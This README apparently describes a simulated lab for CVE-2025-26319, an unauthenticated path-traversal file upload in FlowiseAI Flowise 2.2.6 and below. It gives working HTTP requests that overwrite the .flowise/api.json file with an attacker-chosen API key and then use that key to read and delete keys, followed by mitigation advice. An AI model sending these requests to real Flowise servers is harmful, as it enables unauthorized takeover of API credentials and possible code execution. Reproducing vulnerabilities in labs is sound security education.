# FlowiseAI Flowise - Arbitrary File Upload Vulnerability (CVE-2025-26319)

This is a simulated implementation of the CVE-2025-26319 vulnerability found in FlowiseAI Flowise version 2.2.6 and below. This implementation is for educational purposes only.

## Vulnerability Description

FlowiseAI Flowise version 2.2.6 and below contains an arbitrary file upload vulnerability in the `/api/v1/attachments` endpoint. This vulnerability allows an unauthenticated attacker to upload files outside the intended directory through path traversal, potentially leading to API key exposure and remote code execution.

## How to Exploit

1. Send a POST request to `/api/v1/attachments/../../../.flowise/` with a file named `api.json` containing malicious configuration:

```
POST /api/v1/attachments/../../../.flowise/ HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydTh0yj8zypRgPT1w

------WebKitFormBoundarydTh0yj8zypRgPT1w
Content-Disposition: form-data; name="files";filename="api.json"
Content-type: text/plain

[{
"keyName":"=",
"apiKey":"24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ",
"apiSecret":"8648f55db62716a6577b565efb66145b9ad8c50884c57ae8d4f03c4cd8b3ee27b1f77804d320f08bac8aa4b0dbf58a39dacbb767eb05efe1e57d5c66e5d48473.af4b3f229bd11ac5",
"createdAt":"111",
"id":"1111"
}]
------WebKitFormBoundarydTh0yj8zypRgPT1w--
```

2. After uploading the malicious file, you can access the API key by sending a GET request to `/api/v1/apikey` with the API key in the Authorization header:

```
GET /api/v1/apikey HTTP/1.1
Host: localhost
Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
```

3. You can also delete the API key by sending a DELETE request to `/api/v1/apikey/1111`:

```
DELETE /api/v1/apikey/1111 HTTP/1.1
Host: localhost
Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
```

## Impact

This vulnerability allows an attacker to:
1. Upload files outside the intended directory
2. Overwrite the `.flowise/api.json` configuration file
3. Expose API keys and secrets
4. Potentially achieve remote code execution

## Mitigation

To fix this vulnerability:
1. Validate file paths to prevent path traversal
2. Restrict file uploads to specific directories
3. Implement proper authentication and authorization
4. Use secure file handling practices

## Disclaimer

This implementation is for educational purposes only. Do not use this code in production environments. 